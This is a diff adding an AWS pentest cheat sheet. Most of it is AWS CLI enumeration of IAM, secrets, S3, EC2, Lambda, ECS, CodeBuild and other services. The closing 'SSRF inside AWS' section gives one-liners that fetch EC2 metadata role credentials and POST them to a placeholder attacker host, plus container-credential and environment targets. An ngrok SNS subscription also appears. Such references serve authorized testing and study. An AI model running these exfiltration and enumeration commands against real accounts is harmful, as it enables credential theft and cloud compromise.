@@ -1,0 +1,306 @@
+Introduction
+
+Nowadays, it is pretty common that applications are being executed inside cloud environments like Amazon Web Service (AWS). In this section, you will learn some techinques that will help you to enumerate your environment.
+Profile Configuration
+
+aws configure --profile $profile
+aws configure set aws_session_token "" --profile $profile
+
+Assume Role
+
+# Assume the role
+aws sts assume-role \
+  --role-session-name "PostExploitSession" \
+  --profile $profile \
+  --role-arn "" > /tmp/post_creds.json
+
+# Export to environment variables
+## JQ
+export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' /tmp/post_creds.json)
+export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' /tmp/post_creds.json)
+export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' /tmp/post_creds.json)
+## Python
+export AWS_ACCESS_KEY_ID=$(python3 -c 'import json; print(json.load(open("/tmp/post_creds.json"))["AccessKeyId"])')
+export AWS_SECRET_ACCESS_KEY=$(python3 -c 'import json; print(json.load(open("/tmp/post_creds.json"))["SecretAccessKey"])')
+export AWS_SESSION_TOKEN=$(python3 -c 'import json; print(json.load(open("/tmp/post_creds.json"))["Token"])')
+
+# Update the AWS CLI profile configuration
+aws configure set aws_access_key_id "$AWS_ACCESS_KEY_ID" --profile $profile
+aws configure set aws_secret_access_key "$AWS_SECRET_ACCESS_KEY" --profile $profile
+aws configure set aws_session_token "$AWS_SESSION_TOKEN" --profile $profile
+aws configure set region us-east-1 --profile $profile
+aws configure set output json --profile $profile
+
+Caller identity
+
+Enumeration Commands
+
+aws sts get-caller-identity --query 'Arn' --output text --profile $profile
+aws iam get-user --profile $profile
+# If you only have a Key ID
+aws sts get-access-key-info --access-key-id=ASIA1234567890123456
+
+IAM
+Policies
+
+Enumeration Commands
+
+# Obtain none default policies
+aws iam list-policies --scope Local --profile $profile \
+--query 'Policies[].{PolicyName:PolicyName, PolicyARN:Arn}' --output table
+
+
+aws iam list-attached-user-policies --query AttachedPolicies --profile $profile --user-name ""
+
+aws iam get-policy-version --version-id v1 --query 'PolicyVersion.Document.Statement[]' --profile $profile --policy-arn ""
+
+Roles
+
+aws iam list-roles --profile $profile | jq .Roles[].RoleName
+#Get role
+aws iam get-role --profile $profile  --role-name <role-name> 
+## inline policies
+aws iam list-role-policies --profile $profile --role-name <name> #Get inline policies of a role
+aws iam get-role-policy --profile $profile --role-name <name> --policy-name "" #Get inline policy details
+## attached policies in roles
+aws iam list-attached-role-policies --profile $profile --role-name "" #Get policies of role, it doesn't get inline policies
+
+Secrets
+
+Enumeration Commands
+
+aws secretsmanager list-secrets --profile $profile --query 'SecretList[].Name'
+aws secretsmanager get-secret-value --profile $profile --secret-id ""
+
+KMS
+
+Enumeration Commands
+
+aws kms list-aliases --profile $profile --query 'Aliases[?TargetKeyId].{AliasName:AliasName, TargetKeyId:TargetKeyId}'
+
+# Check key access
+aws kms list-keys --profile $profile --query Keys[].KeyId | jq .[] -r | xargs -I [] bash -c 'aws kms describe-key --key-id [] --profile $profile 2>&1 | grep -v AccessDeniedException'
+
+# Key Policy
+aws kms list-key-policies --profile $profile --query PolicyNames --key-id ""
+aws kms get-key-policy --profile $profile --query Policy --output text --policy-name "<default>" --key-id "" 
+
+S3
+
+Enumeration Commands
+
+aws s3 ls --profile $profile
+
+aws s3api get-bucket-policy --profile $profile --query Policy --output text --bucket "" | jq
+
+aws s3api get-object-acl --profile $profile --bucket "" --key "flag.txt" 
+
+EC2
+
+Enumeration Commands
+
+aws ec2 describe-instances \
+ 	--output json --profile $profile \
+    --query 'Reservations[*].Instances[*].{Instance:InstanceId,Type:InstanceType,IamProfile:IamInstanceProfile.Arn,State:State.Name,PrivateIP:PrivateIpAddress,PublicIP:PublicIpAddress,SGs:SecurityGroups[*],Name:Tags[?Key==`Name`].Value | [0]}' 
+    
+# Enumerate ONLY EC2 instances with public IPs
+aws ec2 describe-instances --query "Reservations[].Instances[?PublicIpAddress!=null].PublicIpAddress" --output text --profile $profile
+
+# UserData
+aws ec2 describe-instance-attribute --profile $profile \
+	--region us-east-1 --instance-id "" \
+	--attribute userData  | jq ".UserData.Value" | tr -d '"' | base64 -d
+
+
+aws ec2 describe-security-groups \
+	--output table --profile $profile \
+	--group-ids "" \
+	--query 'SecurityGroups[*].IpPermissions[*].{Protocol:IpProtocol, FromPort:FromPort, ToPort:ToPort, Source:IpRanges[*].CidrIp | [0]}'
+
+# Get if IMDSv2 is enabled 
+# "HttpTokens": "optional" -> IMDSv1 & IMDSv2 are accepted
+# "HttpTokens": "required" -> IMDSv2 is enforced
+aws ec2 describe-instances \
+    --instance-ids "" \
+    --query 'Reservations[*].Instances[*].MetadataOptions' \
+    --profile $profile
+
+LightSail - Database
+
+Enumeration Commands
+
+aws lightsail get-instances --profile $profile
+
+aws lightsail get-relational-databases \
+	--query 'relationalDatabases[*].{Name:name, Host:masterEndpoint.address, Port:masterEndpoint.port, User:masterUsername, Public:publiclyAccessible, State:state}' \
+	--output json --profile $profile
+
+RDS
+
+Enumeration Commands
+
+aws rds describe-db-instances --profile $profile --output json \
+  --query 'DBInstances[*].{ID:DBInstanceIdentifier, Status:DBInstanceStatus, Engine:Engine, Class:DBInstanceClass, Size:AllocatedStorage, Public:PubliclyAccessible, Endpoint:Endpoint.Address, Port:Endpoint.Port, MasterUser:MasterUsername, Roles:AssociatedRoles}'
+		
+aws rds describe-db-snapshots \
+    --include-public \
+    --profile $profile \
+    --query "DBSnapshots[?contains(DBSnapshotIdentifier, '<SOURCE_ACCOUNT_ID>:')].[DBSnapshotIdentifier,Engine,AllocatedStorage]"
+
+Lambda
+
+Enumeration Commands
+
+aws lambda list-functions --profile $profile --output json \
+  --query 'Functions[*].{Name:FunctionName, ARN:FunctionArn, Role:Role, Runtime:Runtime, Description:Description, Env:Environment.Variables, Handler:Handler}'
+  
+aws lambda get-function-url-config \
+  --profile $profile \
+  --function-name ""
+  
+wget -nv -O /tmp/lambda_function.zip $(aws lambda get-function --profile $profile --query 'Code.Location' --function-name "" --output text)
+
+EFS
+
+Enumeration Commands
+
+# Enumerating the EFS and its mount targets
+aws efs describe-file-systems --profile $profile --query 'FileSystems[].FileSystemId' --output text \
+| tr '\t' '\n' \
+| while read fs; do
+    echo "=== $fs ===";
+    aws efs describe-file-systems --file-system-id "$fs" \
+      --profile $profile \
+      --query 'FileSystems[].{Id:FileSystemId,State:LifeCycleState,Encrypted:Encrypted,MountTargets:NumberOfMountTargets}' \
+      --output table;
+    aws efs describe-mount-targets --file-system-id "$fs" \
+      --profile $profile \
+      --query 'MountTargets[].{MountTargetId:MountTargetId,SubnetId:SubnetId,AZ:AvailabilityZoneName,Ip:IpAddress}' \
+      --output table;
+  done
+
+DynamoDB
+
+Enumeration Commands
+
+aws dynamodb list-tables --profile $profile --query TableNames
+aws dynamodb describe-table --profile $profile --table-name ""
+
+ECR
+Source & Post-Exploitation
+ECS
+
+Enumeration Commands
+
+aws ecs list-clusters --query clusterArns --profile $profile
+aws ecs list-container-instances --profile $profile  --cluster ""
+
+aws ecs describe-container-instances \
+    --query 'containerInstances[*].{InstanceID: ec2InstanceId,Agent: agentConnected,Attributes: attributes[?value != `null` && value != ``].{Name:name, Value:value}}' \
+    --output json \
+    --profile $profile \
+    --cluster "" \
+    --container-instances "" 
+    
+aws ecs list-tasks --query taskArns --profile $profile --cluster ""
+
+aws ecs describe-tasks \
+    --query 'tasks[*].{ TaskId: taskArn, ExecuteCommand: enableExecuteCommand, LastStatus: lastStatus, Containers: containers[*].{Name:name, RuntimeId:runtimeId, Privileged:privileged}, Overrides: overrides.containerOverrides[*].{Name:name, Env:environment}, ENI: attachments[?type==`ElasticNetworkInterface`].details[?name==`networkInterfaceId`].value | [0] }' \
+    --profile $profile \
+    --cluster "" \
+    --tasks ""
+
+ElasticBeanStalk
+
+Enumeration Commands
+
+aws elasticbeanstalk describe-applications \
+	 --query 'Applications[*].{Name:ApplicationName, Arn:ApplicationArn, Versions:Versions, ConfigurationTemplates:ConfigurationTemplates}' \
+--profile $profile
+
+aws elasticbeanstalk describe-application-versions \
+    --query 'ApplicationVersions[*].{Version:VersionLabel, Bucket:SourceBundle.S3Bucket, Key:SourceBundle.S3Key, Date:DateCreated}' \
+    --output table \
+    --profile $profile \
+    --application-name "<YourAppName>" \
+
+
+aws elasticbeanstalk describe-environments \
+    --query 'Environments[*].{Name:EnvironmentName, URL:CNAME,EndpointURL:EndpointURL, ApplicationName:ApplicationName,VersionLabel:VersionLabel, PlatformArn: PlatformArn, Tier:Tier, EnvironmentLinks:EnvironmentLinks, Status:Status, Health:Health}' \
+    --profile $profile  \
+    --application-name "<ApplicationName>"
+
+Codebuild
+
+Enumeration Commands
+
+aws codebuild list-projects --profile $profile
+
+aws codebuild batch-get-projects \
+    --query 'projects[*].{
+        Name: name,
+        Description: description,
+        Source: source.{Type:type, Location:location, Buildspec:buildspec},
+        Role: serviceRole,
+        Privileged: environment.privilegedMode,
+        Env: environment,
+        Vpc: vpcConfig.vpcId,
+        encryptionKey: encryptionKey
+    }' --output json \
+    --profile $profile \
+    --names exam_1_project
+    
+    
+aws codebuild list-source-credentials --profile $profile
+aws codebuild list-builds-for-project --profile $profile --project-name ""
+aws codebuild batch-get-builds --profile $profile --ids "" 
+
+SQS
+
+Enumeration Commands
+
+aws sqs list-queues --query QueueUrls --profile $profile
+aws sqs get-queue-attributes --profile $profile --attribute-names All  --queue-url ""
+
+SNS
+
+Enumeration Commands
+
+aws sns list-topics --query Topics --profile $profile 
+
+aws sns get-topic-attributes --profile $profile --region us-east-1 --topic-arn ""
+
+aws sns subscribe --profile $profile --protocol https --topic-arn <TopicArn> --notification-endpoint https://<YOUR_NGROK_ID>.ngrok-free.app 
+
+Cognito
+
+Enumeration Commands
+
+aws cognito-idp list-user-pools --max-results 10 --profile $profile
+
+SSRF inside AWS
+
+Enumeration Commands
+
+If you can perform an SSRF attack inside an AWS EC2 instance, container, lambda function or elastik server, you can retrieve its temporal credentials.
+
+EC2 Creds - IMDSv1 || Elastic Beanstalk
+
+ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | curl -X POST -d @- http://<IP>:<PORT>/
+
+EC2 Creds - IMDSv2
+
+TOKEN=$(curl -sqk -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); ROLE=$(curl -sqk -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -sqk -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | curl -X POST -d @- http://<IP>:<PORT>/
+
+EC2 User-data
+
+http://169.254.169.254/latest/user-data
+
+Lambda
+
+file:///proc/self/environ
+
+Containers metadata
+
+curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
+
